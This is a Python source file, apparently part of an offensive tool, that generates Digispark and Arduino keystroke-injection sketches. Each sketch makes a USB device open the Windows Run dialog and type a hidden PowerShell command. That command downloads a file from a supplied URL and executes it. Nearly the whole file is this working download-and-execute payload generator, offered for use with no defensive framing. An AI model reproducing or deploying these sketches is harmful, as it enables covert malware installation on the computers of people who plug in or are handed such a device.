import sys
from colorama import Fore
from time import sleep
GREEN=Fore.LIGHTGREEN_EX
RESET=Fore.RESET

def Digispark(url, file_path, DEFAULT_DELAY, MAIN_DELAY):
    digispark_script = f"""
#include "DigiKeyboard.h"

void setup() {{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay({DEFAULT_DELAY}); // Wait for a moment.

  // Open Run dialog (Win + R).
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  DigiKeyboard.delay({DEFAULT_DELAY}); // Wait for the Run dialog to open.

  DigiKeyboard.delay({DEFAULT_DELAY});
  DigiKeyboard.println("powershell.exe -WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri '{url}' -OutFile '{file_path}'; Invoke-Expression -Command '{file_path}'\\"");
  DigiKeyboard.delay({MAIN_DELAY});
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
}}

void loop() {{}}
"""
    return digispark_script

def Arduino(url, file_path, DEFAULT_DELAY, MAIN_DELAY):
    arduino_script = f"""
void setup() {{
  Keyboard.begin();
  // Open the Run dialog with Win + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay({DEFAULT_DELAY});
  Keyboard.println("powershell.exe -WindowStyle Hidden -Command \\"Invoke-WebRequest -Uri '{url}' -OutFile '{file_path}'; Invoke-Expression -Command '{file_path}'\\"");

  delay({MAIN_DELAY})
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}}

void loop() {{}}
"""
    return arduino_script
def check(prompt):
  print(Fore.LIGHTBLUE_EX+"[*] "+RESET+prompt)
  #  slashes=["|","/","-","\x5c","\x5c"]
  #  out = 0
  #  s = 0
  #  while True:
  #        if s == 4:
  #           s = 0
  #        out+=1
  #        s+=1
  #        if out == 24:
  #          sys.stdout.write(f'\r{GREEN}[$] {RESET}{prompt} ' + slashes[2]) 
  #          break
  #        else:
  #           sys.stdout.write(f'\r{GREEN}[$] {RESET}{prompt} ' + slashes[s])
  #        sys.stdout.flush()
  #        sleep(0.125)
  #  sleep(0.15)
  #  print()
